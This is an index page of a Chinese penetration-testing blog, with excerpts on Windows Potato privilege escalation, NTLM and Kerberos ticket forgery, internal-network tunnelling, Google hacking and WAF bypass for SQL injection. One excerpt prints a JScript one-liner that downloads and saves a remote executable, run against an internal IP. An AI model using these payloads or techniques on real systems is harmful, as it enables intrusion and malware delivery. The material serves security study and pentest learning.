<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Zeo's Security Lab - Zeo Security Lab</title><meta name="author" content="Zeo"><meta name="copyright" content="Zeo"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="专注于安全,分享生活,分享知识">
<meta property="og:type" content="website">
<meta property="og:title" content="Zeo&#39;s Security Lab">
<meta property="og:url" content="https://godzeo.github.io/page/8/index.html">
<meta property="og:site_name" content="Zeo&#39;s Security Lab">
<meta property="og:description" content="专注于安全,分享生活,分享知识">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202210231013354.png">
<meta property="article:author" content="Zeo">
<meta property="article:tag" content="WEB安全">
<meta property="article:tag" content="代码审计">
<meta property="article:tag" content="内网">
<meta property="article:tag" content="渗透">
<meta property="article:tag" content="二进制">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202210231013354.png"><link rel="shortcut icon" href="/img/WX20211124-162855.png"><link rel="canonical" href="https://godzeo.github.io/page/8/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Zeo\'s Security Lab',
  isPost: false,
  isHome: true,
  isHighlightShrink: false,
  isToc: false,
  postUpdate: '2023-03-22 08:21:17'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Zeo's Security Lab" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202210231013354.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">132</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">53</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background-image: url('https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152154457.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Zeo's Security Lab</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">Zeo's Security Lab</h1><div id="site-subtitle"><span id="subtitle"></span></div><div id="site_social_icons"><a class="social-icon" href="https://github.com/godzeo" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:zzzhhhaaaiiii@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="post_cover left"><a href="/2020/05/25/%E7%83%82%E5%9C%9F%E8%B1%86Juicypotato%E6%8F%90%E6%9D%83%E5%8E%9F%E7%90%86%E5%92%8C%E5%88%A9%E7%94%A8/" title="烂土豆Juicypotato提权原理和利用"><img class="post_bg" src="https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152157832.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="烂土豆Juicypotato提权原理和利用"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/05/25/%E7%83%82%E5%9C%9F%E8%B1%86Juicypotato%E6%8F%90%E6%9D%83%E5%8E%9F%E7%90%86%E5%92%8C%E5%88%A9%E7%94%A8/" title="烂土豆Juicypotato提权原理和利用">烂土豆Juicypotato提权原理和利用</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-05-25T07:45:02.000Z" title="发表于 2020-05-25 15:45:02">2020-05-25</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">内网安全研究</a></span></div><div class="content">

0x00 Potato（烂土豆）提权的原理：所谓的烂土豆提权就是俗称的MS16-075
可以将Windows工作站上的特权从最低级别提升到“ NT AUTHORITY \ SYSTEM” – Windows计算机上可用的最高特权级别。
一、简单的原理：攻击者可以诱骗用户尝试使用NTLM对他的计算机进行身份验证，则他可以将该身份验证尝试中继到另一台计算机！
Microsoft通过使用已经进行的质询来禁止同协议NTLM身份验证来对此进行修补。这意味着从一个主机回到自身的SMB-&gt; SMB NTLM中继将不再起作用。但是，跨协议攻击（例如HTTP-&gt; SMB）仍然可以正常使用！
二、我的理解流程：1、所以我们控制HTTP流量大概都流经我们控制的HTTP服务器，做中介人攻击。
2、可以诱导系统高权用户执行一些操作，例如将它们重定向到需要NTLM身份验证的地方。所有NTLM凭据都将中继到本地SMB侦听器，以创建运行用户定义的命令的新系统服务，例如是Windows Update服务的请求时，就会是一个高权令牌，劫持掉这个令牌
3、最后模仿这个高权令牌。只有具有“模仿安全令牌权限”的 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2020/05/25/%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83%E5%8E%86%E5%8F%B2%E8%BF%9B%E7%A8%8B/" title="土豆提权历史进程"><img class="post_bg" src="https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152204342.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="土豆提权历史进程"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/05/25/%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83%E5%8E%86%E5%8F%B2%E8%BF%9B%E7%A8%8B/" title="土豆提权历史进程">土豆提权历史进程</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-05-25T07:43:01.000Z" title="发表于 2020-05-25 15:43:01">2020-05-25</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">内网安全研究</a></span></div><div class="content">

0x01简介在研究提权的时候，发现最近这些东西比较多，而且我自己看起来也是比较混乱，就从网上收集了一些资料，做一个整合和搬运，复现和整理一下，方便你我
现在还是有点迷糊，这个估计会再更新，等我再理的清楚一些，然后后面就是单个的文章发布，这个是总的简介
0x01 历史进程2016-01-16 初代土豆劫持wpad配合ntlm中继来进行提权
Hot Potato – Windows Privilege Escalation
2016-09-26 二代土豆劫持系统com服务器地址到恶意服务器上,然后在NTLM Type 3时做AcceptSecurityContext调用去拿system的令牌
Rotten Potato – Privilege Escalation from Service
2018&#x2F;01&#x2F;13 土豆token细节Potatoes and tokens – Decoder’s Blog
2018-08-10 整理了一些可用的CLSID​ Juicy Potato (abusing the golden privileges) | jui…
2018& ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2020/05/22/docker!%E6%89%93%E5%8C%85%E6%AD%A3%E5%9C%A8%E8%BF%90%E8%A1%8C%E7%9A%84%E5%AE%B9%E5%99%A8%EF%BC%8C%E5%BF%AB%E9%80%9F%E6%8B%96%E7%8E%AF%E5%A2%83%E8%B7%91%E8%B7%AF/" title="docker:打包正在运行的容器，快速拖环境跑路"><img class="post_bg" src="https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152154662.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="docker:打包正在运行的容器，快速拖环境跑路"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/05/22/docker!%E6%89%93%E5%8C%85%E6%AD%A3%E5%9C%A8%E8%BF%90%E8%A1%8C%E7%9A%84%E5%AE%B9%E5%99%A8%EF%BC%8C%E5%BF%AB%E9%80%9F%E6%8B%96%E7%8E%AF%E5%A2%83%E8%B7%91%E8%B7%AF/" title="docker:打包正在运行的容器，快速拖环境跑路">docker:打包正在运行的容器，快速拖环境跑路</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-05-22T08:54:15.000Z" title="发表于 2020-05-22 16:54:15">2020-05-22</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E9%85%8D%E7%8E%AF%E5%A2%83/">配环境</a></span></div><div class="content">

遇到了一个docker环境，需求带回来自己调试，所以记录大致流程docker:打包正在运行的容器，快速拖环境跑路
获取正在运行的容器1docker ps


找到ID 6996fffb6bfa
将容器打包成镜像1docker commit -a &quot;runoob.com&quot; -m &quot;my apache&quot; 容器名称或id 打包的镜像名称:标签


拖到本地1docker save cnvd -o /Users/zy/Documents/source/sec.tar


导入镜像1docker load -i hackgod-demo.tar</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2020/05/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8!NTML%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B%E5%92%8CPTH%E5%8E%9F%E7%90%86/" title="内网安全:NTML认证流程和PTH原理"><img class="post_bg" src="https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152203945.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网安全:NTML认证流程和PTH原理"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/05/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8!NTML%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B%E5%92%8CPTH%E5%8E%9F%E7%90%86/" title="内网安全:NTML认证流程和PTH原理">内网安全:NTML认证流程和PTH原理</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-05-14T05:41:28.000Z" title="发表于 2020-05-14 13:41:28">2020-05-14</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">内网安全研究</a></span></div><div class="content">

NTML认证流程和PTH原理.

0x01 本地认证流程
0x02 网络认证

LM Hash和NTML Hash
NTLM Hash
NTLM V2协议


0x03 NTLM 认证
0x04 Pass The Hash （PTH）原理

主要作用：
前提：
原理：
使用方法：
绕过补丁，进行哈希传递





0x01 本地认证流程操作系统会显示登录界面，接收输入密码后，将密码交给lsass进程，这个进程中会存一份明文密码，将明文密码加密成NTLM Hash，和SAM数据库比较认证。

注：

winlogon.exe（Windows Logon Process），用于管理用户登录和退出。
LSASS用于微软Windows系统的安全机制，它用于本地安全和登陆策略。

0x02 网络认证在内网中，早期SMB协议在网络上传输明文口令。后来出现LM hash，很容易就被破解，现在又有了NTLM以及Kerberos。
LM Hash和NTML HashWindows操作系统中的密码由两部分加密组成，即LM Hash和NTML Hash。
NTLM Hash正常的明文密码加密为NTLM  ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2020/05/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8!Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B---%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/" title="内网安全:Kerberos域认证流程---黄金票据和白银票据"><img class="post_bg" src="https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152154662.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网安全:Kerberos域认证流程---黄金票据和白银票据"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/05/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8!Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B---%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/" title="内网安全:Kerberos域认证流程---黄金票据和白银票据">内网安全:Kerberos域认证流程---黄金票据和白银票据</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-05-12T06:11:44.000Z" title="发表于 2020-05-12 14:11:44">2020-05-12</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">内网安全研究</a></span></div><div class="content">

文章目录

0x00 前提
0x01 Kerberos域认证
域认证大致流程：
第一部分：生成TGT 和 session key
第二步：获取要访问的 server ticket
第三部 向客户端向服务器请求认证
0x01 白银票据(Silver Tickets)

伪造白银票据(Silver Tickets)


0x02 黄金票据（Golden Ticket）

伪造黄金票据


0x03 黄金票据和白银票据比较
0x04 参考



0x00 前提算是学习之后总结记录，加深自己的理解，这里我是参考了倾旋师傅的讲解，感觉讲的比较好，加入自己的理解和一些其他东西写下来，分享出来，也方便自己回顾知识和补充还有画图的问题，我自己画的太费劲了而且也看不明白，索性我就自己手画了几个，方便自己理解和熟悉流程，感觉不错，手动狗头，哈哈
0x01 Kerberos域认证Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机 &#x2F; 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2020/05/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%20AreUSerialz%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/" title="网鼎杯 AreUSerialz反序列化题目"><img class="post_bg" src="https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152154568.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="网鼎杯 AreUSerialz反序列化题目"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/05/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%20AreUSerialz%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/" title="网鼎杯 AreUSerialz反序列化题目">网鼎杯 AreUSerialz反序列化题目</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-05-11T13:15:13.000Z" title="发表于 2020-05-11 21:15:13">2020-05-11</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></span></div><div class="content">

看了网鼎杯 AreUSerialz反序列化题目wp对php的反序列化又有了学到了新的知识点，之前都没注意到
标题题目是这样的：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123;   protected $op;   protected $filename;   protected $content;   function _ ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2020/05/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%B0%8F%E7%BB%93/" title="内网安全学习从入门到入狱-知识-内网隧道技术小结"><img class="post_bg" src="https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152203945.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网安全学习从入门到入狱-知识-内网隧道技术小结"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/05/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%B0%8F%E7%BB%93/" title="内网安全学习从入门到入狱-知识-内网隧道技术小结">内网安全学习从入门到入狱-知识-内网隧道技术小结</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-05-06T02:49:39.000Z" title="发表于 2020-05-06 10:49:39">2020-05-06</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">内网安全研究</a></span></div><div class="content">

文章目录
0x00 内网穿透技术
0x01 首先判断出网协议
0x02 各种协议隧道
网络层

ICMP隧道
Lcx


传输层

瑞士军刀：nc
Powercat（powershell版的nc）
推荐：netsh端口转发（window平台）


应用层

SSH转发：
SSH 本地转发机制：
SSH 远程转发机制：
SSH 动态转发机制：
HTTP HTTPS协议隧道
DNS 隧道：
Socks代理：
推荐使用
Nps
ew
Frp
Venom


0x03 总结

0x00 内网穿透技术当我们拿到一台内网主机后，一般都是有区域隔离的。
所以内网隧道技术，就是我们必须要掌握的。
我简单介绍一下建立通信隧道，常见的有端口转发等
主要隧道有：
ICMP TCP UDP
SSH HTTP DNS
SOCKS
0x01 首先判断出网协议icmp协议：
12ping 命令ping www.baidu.com

TCP协议：
12curl www.baidu.comnc IP

HTTP协议：
12curl ip:portcurl www.baidu.com:80

DNS协议：
12Nsl ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2020/04/26/google%20hack%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%B8%B8%E7%94%A8%E6%80%BB%E7%BB%93/" title="google hack搜索引擎常用总结"><img class="post_bg" src="https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152157975.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="google hack搜索引擎常用总结"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/04/26/google%20hack%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%B8%B8%E7%94%A8%E6%80%BB%E7%BB%93/" title="google hack搜索引擎常用总结">google hack搜索引擎常用总结</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-04-26T02:05:57.000Z" title="发表于 2020-04-26 10:05:57">2020-04-26</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/WEB-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/">WEB 漏洞复现和分析</a></span></div><div class="content">

简介
在渗透测试中，利用搜索引擎信息收集还是很不错，常常有意外的收获，也可以用在一些镜像库里面搜索信息收集
还有之前看到的一些，都总结分享一下

主要的常用一些语法12345678910111213site：可以限制你搜索范围的域名inurl：用于搜索网页上包含的URL，这个语法对寻找网页上的搜索，帮助之类的很有用.intext: 只搜索网页部分中包含的文字(也就是忽略了标题、URL等的文字)intitle: 查包含关键词的页面，一般用于社工别人的webshell密码filetype：搜索文件的后缀或者扩展名intitle：限制你搜索的网页标题.link: 可以得到一个所有包含了某个指定URL的页面列表.

实例查找后台地址：site域名
12这个真的好用查看某公司的表格找账户：site:域名 filetype:xlsx

1234567891011121314151617inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms查找文本内容：site:域名 intext:管理 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2020/04/24/%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/" title="一句话下载payload（持续更新）"><img class="post_bg" src="https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152154494.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="一句话下载payload（持续更新）"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/04/24/%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/" title="一句话下载payload（持续更新）">一句话下载payload（持续更新）</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-04-24T05:24:07.000Z" title="发表于 2020-04-24 13:24:07">2020-04-24</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">内网安全研究</a></span></div><div class="content">

js一句话下载payloadwindows 全版本都会默认支持 js，并且通过cscript 来调用达到下载 payload 的目的。
12345678var WinHttpReq = new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);WinHttpReq.Open(&quot;GET&quot;, WScript.Arguments(0), /*async=*/false);WinHttpReq.Send();​BinStream = new ActiveXObject(&quot;ADODB.Stream&quot;); BinStream.Type = 1;​BinStream.Open(); BinStream.Write(WinHttpReq.ResponseBody);BinStream.SaveToFile(&quot;micropoor.exe&quot;);

1C:\test&gt;cscript /nologo dowfile2.js http://192.168.1.1/eval.exe

还 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2020/04/21/%E4%BB%8E%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E5%88%B0%E7%BC%96%E5%86%99tamper%E8%84%9A%E6%9C%AC/" title="从绕过安全狗到编写tamper脚本"><img class="post_bg" src="https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152157975.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="从绕过安全狗到编写tamper脚本"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/04/21/%E4%BB%8E%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E5%88%B0%E7%BC%96%E5%86%99tamper%E8%84%9A%E6%9C%AC/" title="从绕过安全狗到编写tamper脚本">从绕过安全狗到编写tamper脚本</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-04-21T01:23:23.000Z" title="发表于 2020-04-21 09:23:23">2020-04-21</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/WEB-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/">WEB 漏洞复现和分析</a></span></div><div class="content">

文章目录
0x00 简述
0x01 首先我们要判断哪个关键字被拦截了
0x02 一些简单的知识点
0x03 总结安全狗拦截的点
0x04 Sqlmap tamper的编写
0x05 tamper主要的三个部分
0x06 tamper编写测试方法
0x07 结束

0x00 简述
安全狗这些waf都是有一个特性，都是基于正则匹配去过滤的
但是实际情况是需要权衡可用性和安全性
当然厂商肯定是考虑到用户体验，所以不能出现什么东西都拦截
所以最终就是正则的绕过
注意：
版本不同，他的正则规则也是不一样的
所以有的payload在新老版本是不能同吃。
但是没有关系，你学会这么绕，这都不是问题。

0x01 首先我们要判断哪个关键字被拦截了我们以 order by 3 这个简单的语句为例子
提供思路就是破坏单词去测试：
123456http://10.211.55.4/Less-2/?id=1 order by 3  （拦截）http://10.211.55.4/Less-2/?id=1 ordwer by 3 （破坏了order 没有拦截）http://10.211.55.4/Less-2/ ...</div></div></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/7/#content-inner"><i class="fas fa-chevron-left fa-fw"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/#content-inner">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/#content-inner">9</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/#content-inner">14</a><a class="extend next" rel="next" href="/page/9/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202210231013354.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Zeo</div><div class="author-info__description">专注于安全,分享生活,分享知识</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">132</div></a><a 